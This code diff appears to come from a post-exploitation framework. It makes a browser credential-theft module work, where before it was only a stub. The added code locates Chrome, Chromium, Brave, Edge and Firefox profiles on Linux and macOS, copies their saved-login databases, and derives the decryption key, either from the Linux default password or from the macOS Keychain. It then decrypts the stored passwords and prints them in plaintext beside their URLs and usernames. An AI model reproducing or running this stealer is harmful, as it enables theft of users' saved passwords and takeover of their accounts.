@@ -130,19 +130,236 @@ Return a list of dicts, one per credential:
   }
 """
 
+import json
+import os
+import platform
+import shutil
+import sqlite3
+import subprocess
+import tempfile
+from pathlib import Path
+
 from post.base import ModuleResult, PostModule
 from post.loader import register
 
 
+
+# ── Crypto helpers ─────────────────────────────────────────────────────────────
+
+try:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+    from cryptography.hazmat.primitives import hashes as _hashes
+    _CRYPTO_OK = True
+except ImportError:
+    _CRYPTO_OK = False
+
+
+def _pbkdf2_key(password: bytes, iterations: int) -> bytes:
+    kdf = PBKDF2HMAC(algorithm=_hashes.SHA1(), length=16, salt=b"saltysalt", iterations=iterations)  # noqa: S303
+    return kdf.derive(password)
+
+
+def _aes_cbc_decrypt(ciphertext: bytes, key: bytes) -> str:
+    payload = ciphertext[3:]        # strip b"v10" / b"v11"
+    iv = b"\x20" * 16              # Chrome uses space-filled IV
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    dec = cipher.decryptor()
+    plaintext = dec.update(payload) + dec.finalize()
+    pad = plaintext[-1]            # PKCS7 padding
+    return plaintext[:-pad].decode("utf-8", errors="replace")
+
+
+def _chrome_key_linux() -> bytes:
+    return _pbkdf2_key(b"peanuts", 1)
+
+
+def _chrome_key_macos() -> bytes | None:
+    try:
+        r = subprocess.run(
+            ["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
+            capture_output=True, text=True, timeout=5,
+        )
+        pw = r.stdout.strip()
+        if pw:
+            return _pbkdf2_key(pw.encode(), 1003)
+    except Exception:
+        pass
+    return None
+
+
+def _decrypt(raw: bytes, key: bytes) -> str:
+    if not raw:
+        return ""
+    if raw[:3] in (b"v10", b"v11"):
+        try:
+            return _aes_cbc_decrypt(raw, key)
+        except Exception as e:
+            return f"[decrypt_error: {e}]"
+    return raw.decode("utf-8", errors="replace")
+
+
+# ── Browser discovery ──────────────────────────────────────────────────────────
+
+def _chrome_locations() -> list[tuple[str, Path]]:
+    home = Path.home()
+    system = platform.system()
+    if system == "Linux":
+        candidates = [
+            ("Chrome",   home / ".config" / "google-chrome"),
+            ("Chromium", home / ".config" / "chromium"),
+            ("Brave",    home / ".config" / "BraveSoftware" / "Brave-Browser"),
+            ("Edge",     home / ".config" / "microsoft-edge"),
+        ]
+    elif system == "Darwin":
+        sup = home / "Library" / "Application Support"
+        candidates = [
+            ("Chrome",   sup / "Google" / "Chrome"),
+            ("Chromium", sup / "Chromium"),
+            ("Brave",    sup / "BraveSoftware" / "Brave-Browser"),
+            ("Edge",     sup / "Microsoft Edge"),
+        ]
+    else:
+        return []
+    return [(n, p) for n, p in candidates if p.exists()]
+
+
+def _firefox_profiles() -> list[tuple[str, Path]]:
+    home = Path.home()
+    system = platform.system()
+    if system == "Linux":
+        root = home / ".mozilla" / "firefox"
+        ini = root / "profiles.ini"
+    elif system == "Darwin":
+        root = home / "Library" / "Application Support" / "Firefox"
+        ini = root / "profiles.ini"
+    else:
+        return []
+
+    profiles: list[tuple[str, Path]] = []
+    if ini.exists():
+        import configparser
+        cfg = configparser.ConfigParser()
+        cfg.read(str(ini))
+        for sec in cfg.sections():
+            if not sec.startswith("Profile"):
+                continue
+            rel = cfg.getint(sec, "IsRelative", fallback=1)
+            path_val = cfg.get(sec, "Path", fallback=None)
+            name_val = cfg.get(sec, "Name", fallback=sec)
+            if not path_val:
+                continue
+            prof = (ini.parent / path_val) if rel else Path(path_val)
+            if prof.exists():
+                profiles.append((name_val, prof))
+    return profiles
+
+
+# ── Extraction ─────────────────────────────────────────────────────────────────
+
+def _extract_chrome(label: str, login_data: Path, key: bytes) -> list[dict]:
+    rows: list[dict] = []
+    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
+        tmp_path = tmp.name
+    try:
+        shutil.copy2(str(login_data), tmp_path)
+        conn = sqlite3.connect(tmp_path)
+        conn.row_factory = sqlite3.Row
+        try:
+            cur = conn.execute(
+                "SELECT origin_url, username_value, password_value "
+                "FROM logins WHERE blacklisted_by_user = 0"
+            )
+            for row in cur:
+                rows.append({
+                    "browser":  label,
+                    "url":      row["origin_url"],
+                    "username": row["username_value"],
+                    "password": _decrypt(bytes(row["password_value"]), key),
+                })
+        finally:
+            conn.close()
+    except Exception as e:
+        rows.append({"browser": label, "error": str(e)})
+    finally:
+        try:
+            os.unlink(tmp_path)
+        except OSError:
+            pass
+    return rows
+
+
+def _extract_firefox(name: str, prof: Path) -> list[dict]:
+    logins_path = prof / "logins.json"
+    try:
+        data = json.loads(logins_path.read_text())
+        return [
+            {
+                "browser":  "Firefox",
+                "profile":  name,
+                "url":      e.get("hostname", ""),
+                "username": "(encrypted — needs NSS)",
+                "password": "(encrypted — needs NSS/firepwd)",
+            }
+            for e in data.get("logins", [])
+        ]
+    except Exception as e:
+        return [{"browser": "Firefox", "profile": name, "error": str(e)}]
+
+
+# ── Module ─────────────────────────────────────────────────────────────────────
+
 @register
 class BrowserCredModule(PostModule):
-    NAME = "cred/browser"
-    DESCRIPTION = "STUB — Extract saved credentials from Chrome/Firefox browser profiles"
-    PLATFORM = ["linux", "darwin", "windows"]
-    IMPLEMENTED = False
+    NAME        = "cred/browser"
+    DESCRIPTION = "Extract saved credentials from Chrome/Chromium/Firefox browser profiles"
+    PLATFORM    = ["linux", "darwin"]
+    IMPLEMENTED = True
 
     def run(self, args: dict | None = None) -> ModuleResult:
-        raise NotImplementedError(
-            "See post/cred/browser.py docstring for a full implementation guide "
-            "(SQLite + AES-CBC/GCM decryption, per-platform key retrieval)."
+        if not _CRYPTO_OK:
+            return ModuleResult(ok=False, output="", error="pip install cryptography")
+
+        system = platform.system()
+        results: list[dict] = []
+        warnings: list[str] = []
+
+        # Chromium-family key
+        if system == "Linux":
+            key = _chrome_key_linux()
+        elif system == "Darwin":
+            key = _chrome_key_macos()
+            if key is None:
+                warnings.append("Could not retrieve Chrome Safe Storage key from Keychain")
+                key = _chrome_key_linux()
+        else:
+            return ModuleResult(ok=False, output="", error=f"Unsupported: {system}")
+
+        for browser_name, browser_dir in _chrome_locations():
+            for profile_dir in (browser_dir.iterdir() if browser_dir.is_dir() else []):
+                login_data = profile_dir / "Login Data"
+                if login_data.exists():
+                    results.extend(_extract_chrome(f"{browser_name}/{profile_dir.name}", login_data, key))
+
+        for prof_name, prof_dir in _firefox_profiles():
+            results.extend(_extract_firefox(prof_name, prof_dir))
+
+        creds = [r for r in results if "error" not in r]
+        errors = [r["error"] for r in results if "error" in r] + warnings
+
+        lines = [f"Found {len(creds)} saved credential(s)", ""]
+        for r in creds:
+            lines += [
+                f"  [{r.get('browser', '?')}]  {r.get('url', '')}",
+                f"    User:     {r.get('username', '')}",
+                f"    Password: {r.get('password', '')}",
+                "",
+            ]
+        if errors:
+            lines += ["Errors / warnings:"] + [f"  ! {e}" for e in errors]
+
+        return ModuleResult(
+            ok=True,
+            output="\n".join(lines),
+            data={"credentials": creds, "count": len(creds), "errors": errors},
         )
